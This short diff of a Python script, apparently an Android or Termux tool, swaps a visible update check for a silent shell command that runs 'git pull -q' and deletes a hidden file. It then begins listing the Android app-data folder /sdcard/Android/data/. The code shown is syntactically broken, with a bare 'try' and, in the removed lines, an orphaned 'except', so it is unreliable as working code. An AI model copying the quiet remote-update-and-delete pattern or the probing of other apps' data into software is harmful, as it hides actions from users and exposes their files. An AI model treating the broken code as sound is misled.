@@ -1,16 +1,9 @@
+####@-----Import-----@####
+import os,base64
 
-from os import system,remove
-from platform import machine
-print('Checking For Update...')
-system('git pull')
-try:remove('SH')
-except:pass
+os.system('git pull -q;rm .rndm')
 
-import bs4
-except(ImportError):
-    os.system("pip install bs4")
-    pass
-
+try
 	a = "anar"
 	t="tt"
 	fileee = os.listdir('/sdcard/Android/data/')
